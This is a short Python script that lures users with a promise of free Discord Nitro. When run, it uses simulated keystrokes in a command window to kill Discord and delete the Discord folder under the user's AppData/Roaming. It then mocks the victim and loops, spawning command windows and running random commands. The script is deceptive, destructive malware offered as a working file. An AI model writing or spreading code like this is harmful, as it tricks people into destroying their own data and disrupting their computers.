import pynput
import time
import subprocess
import os
import random
input("enter to get free nitro(console will open to generate)\n")
os.system("open https://www.youtube.com/watch?v=-bnVGH62Yho&ab_channel=NoTextToSpeech")
k =pynput.keyboard.Controller()
enter = pynput.keyboard.Key.enter
login = os.getlogin()
print("deleting discord temp")
time.sleep(0.5)
cmd =subprocess.Popen("cmd.exe /K cd C:/Users/"+ login +"/AppData/Roaming")
time.sleep(0.3)
os.system("open https://www.youtube.com/watch?v=Qskm9MTz2V4&ab_channel=SheetMusicBoss")
k.type("taskkill /F /IM discord.exe")
k.press(enter)
time.sleep(0.3)
k.type("del discord")
k.press(enter)
time.sleep(0.3)
k.type("y")
k.press(enter)
time.sleep(0.5)
k.type("you really thought you gonna get free nitro")
i =1
w =1

while i <= 100:
 time.sleep(w)
 w =w + w
 k.type("OH NO")
 os.system(str(random.randint(0 , 100000)))
 cmd2 = subprocess.Popen("cmd.exe /K cd C:/")
